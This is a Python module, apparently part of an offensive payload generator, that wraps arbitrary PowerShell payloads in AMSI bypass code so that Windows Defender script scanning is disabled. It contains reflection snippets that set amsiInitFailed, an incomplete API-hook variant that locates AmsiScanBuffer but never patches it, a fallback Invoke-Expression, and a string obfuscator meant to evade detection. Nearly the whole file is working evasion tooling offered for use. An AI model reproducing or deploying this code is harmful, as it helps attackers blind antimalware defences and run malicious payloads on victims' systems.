"""
AMSI (Antimalware Scan Interface) Bypass
Bypasses: Windows Defender, PowerShell script scanning
Technique: Memory patching and API hooking
"""

import random
import string

class AMSIBypass:
    def __init__(self):
        self.bypass_methods = ['memory_patch', 'api_hook', 'context_bypass']
        self.current_method = 'memory_patch'
    
    def randomize(self):
        """Randomize bypass method"""
        self.current_method = random.choice(self.bypass_methods)
    
    def encode(self, payload):
        """Generate AMSI bypass wrapper for payload"""
        if isinstance(payload, bytes):
            payload = payload.decode('utf-8')
        
        if self.current_method == 'memory_patch':
            return self._memory_patch_bypass(payload)
        elif self.current_method == 'api_hook':
            return self._api_hook_bypass(payload)
        else:
            return self._context_bypass(payload)
    
    def _memory_patch_bypass(self, payload):
        """Memory patching AMSI bypass that preserves obfuscated payload"""
        # Simplified AMSI bypass that wraps the obfuscated payload
        var_name = ''.join(random.choices(string.ascii_lowercase, k=6))
        
        bypass_code = f'''
# AMSI Memory Patch Bypass
${var_name} = [Ref].Assembly.GetTypes()
${var_name} = ${var_name} | Where-Object {{$_.Name -like "*iUtils"}}
${var_name}.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Execute obfuscated payload
{payload}
'''
        return bypass_code
    
    def _api_hook_bypass(self, payload):
        """API hooking AMSI bypass that preserves obfuscated payload"""
        var_name = ''.join(random.choices(string.ascii_lowercase, k=6))
        
        bypass_code = f'''
# AMSI API Hook Bypass
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
}}
"@

${var_name} = [Win32]::LoadLibrary("amsi.dll")
${var_name} = [Win32]::GetProcAddress(${var_name}, "AmsiScanBuffer")

# Execute obfuscated payload
{payload}
'''
        return bypass_code
    
    def _context_bypass(self, payload):
        """Context-based AMSI bypass that preserves obfuscated payload"""
        var_name = ''.join(random.choices(string.ascii_lowercase, k=6))
        
        bypass_template = f'''
# AMSI Context Bypass
${var_name} = [System.Management.Automation.PSTypeName]('System.Management.Automation.AmsiUtils').Type
${var_name}.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Execute obfuscated payload
{payload}
'''
        return bypass_template
    
    def _obfuscate_string(self, text):
        """Obfuscate strings to avoid detection"""
        # Split string and use concatenation
        parts = []
        for i in range(0, len(text), 3):
            part = text[i:i+3]
            parts.append(f"'{part}'")
        
        return ' + '.join(parts)
    
    def generate_powershell_wrapper(self, payload):
        """Generate complete PowerShell wrapper"""
        wrapper = f'''
# PowerShell AMSI Bypass Wrapper
try {{
    {self.encode(payload)}
}} catch {{
    # Fallback execution
    Invoke-Expression "{payload}"
}}
'''
        return wrapper